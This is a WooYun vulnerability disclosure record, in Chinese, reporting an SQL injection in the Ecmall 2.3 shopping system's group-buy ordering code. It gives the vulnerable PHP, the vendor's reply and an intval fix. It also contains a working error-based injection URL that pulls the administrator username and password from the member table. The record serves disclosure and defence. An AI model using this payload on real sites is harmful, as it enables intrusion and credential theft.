{"id": 5700, "wybug_id": "wooyun-2014-048957", "wybug_title": "Ecmall 2.3版本存SQL注入漏洞", "wybug_corp": "ShopEx", "wybug_author": "kelon", "wybug_date": "2014-01-15 10:46", "wybug_open_date": "2014-03-01 10:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-01：\t细节向公众公开  简要描述： 没有看到补丁，应该没有补吧 详细说明：  漏洞出现在order.app.php文件团购后下订单时 没有对 $_GET['group_id']进行过滤\nfunction _clear_goods($order_id)    {        switch ($_GET['goods'])        {            case 'groupbuy':                /* 团购的商品 */                $model_groupbuy =& m('groupbuy');                $model_groupbuy->updateRelation('be_join', $_GET['group_id'], $this->visitor->get('user_id'), array(                    'order_id'  => $order_id,                ));//这里没有对$_GET['group_id']进行过滤            break;            }    }\n   漏洞证明：  首先参加一个团购活动，当团购活动结束后，点击购买\n\n点下一步时，更改当前网址如：http://192.168.1.1:8000/ecmall/index.php?app=order&goods=groupbuy&group_id=2 and (select user_name from ecm_member where user_id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecm_member limit 0,1))a from information_schema.tables group by a)b)%23\n\n然后点击\"下单完成并支付\"将会出现注入信息，如管理员账号密码等\n\n   修复方案：  intval过滤ID   版权声明：转载请注明来源 kelon@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-01-17 09:12 厂商回复： 谢谢您的提交，360已经反馈过该问题非常感谢您为shopex信息安全做的贡献！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-15 23:33 |    \t\t永久VIP \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 没什么)\t\t \n  求 私信分享    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}